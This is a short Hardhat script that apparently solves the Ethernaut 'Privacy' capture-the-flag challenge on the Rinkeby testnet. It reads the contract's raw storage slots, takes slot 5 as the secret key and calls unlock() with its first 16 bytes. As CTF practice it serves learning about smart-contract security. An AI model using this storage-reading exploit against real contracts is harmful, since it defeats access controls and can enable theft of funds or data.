/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const INSTANCE = "0x63c4b98B29c511fAc38831235D603f0db43a652e"


async function instanceState(rinkeby) {
  console.log('                          INSTANCE STATE')
  console.log("Storage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("Storage '1'", await rinkeby.getStorageAt(INSTANCE, 1))
  console.log("Storage '2'", await rinkeby.getStorageAt(INSTANCE, 2))
  console.log("Storage '3'", await rinkeby.getStorageAt(INSTANCE, 3))
  console.log("Storage '4'", await rinkeby.getStorageAt(INSTANCE, 4))
  console.log("Storage '5'", await rinkeby.getStorageAt(INSTANCE, 5))
  console.log("Storage '6'", await rinkeby.getStorageAt(INSTANCE, 6))
  console.log("Storage '7'", await rinkeby.getStorageAt(INSTANCE, 7), '\n')
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')

  let Privacy = await hre.ethers.getContractFactory('Privacy')
  let privacy = await Privacy.attach(INSTANCE)


  await instanceState(rinkeby)


  // STEP 1
  //-------------------------------------------------------------
  // Get the key from the storage 
  console.log("STEP 1")
  console.log("Get the key from the storage ")
  const key = await rinkeby.getStorageAt(INSTANCE, 5)
  const keyArray = ethers.utils.arrayify(key)
  //-------------------------------------------------------------
  
  

  // STEP2
  //-------------------------------------------------------------
  // Unlock contract with the key
  console.log("STEP 2")
  console.log("Unlocking...")
  const tx = await privacy.unlock(keyArray.slice(0,16))
  await tx.wait()
  console.log("transaction confirmed !")
  //-------------------------------------------------------------

  await instanceState(rinkeby)
  console.log("You win !")
 }


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
